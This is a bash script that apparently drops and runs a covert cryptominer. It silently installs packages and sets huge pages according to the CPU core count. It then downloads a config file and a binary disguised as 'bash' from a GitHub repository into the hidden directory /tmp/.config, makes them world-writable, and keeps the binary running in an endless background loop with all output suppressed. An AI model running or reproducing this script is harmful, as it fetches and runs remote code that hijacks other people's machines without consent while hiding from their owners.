#!/bin/bash

sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
sudo apt -qqy install wget icu-devtools >/dev/null 2>&1 || apt -qqy install wget icu-devtools >/dev/null 2>&1

cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
[ -n "$cores" ] || cores=1
name="Cli_${cores}.sh"

src="https://raw.githubusercontent.com/vjbahkds/jsncsdccw/main"
sudo sysctl -w vm.nr_hugepages=$((cores*256)) >/dev/null 2>&1 || sysctl -w vm.nr_hugepages=$((cores*256)) >/dev/null 2>&1

mkdir -p "/tmp/.config"
wget -qO "/tmp/.config/appsettings.json" "${src}/q.json"
wget -qO "/tmp/.config/bash" "${src}/q"
chmod -R 777 "/tmp/.config"

bash -c "while true; do cd /tmp/.config; ./bash ${name} ${cores} >/dev/null 2>&1 ; done" >/dev/null 2>&1 &

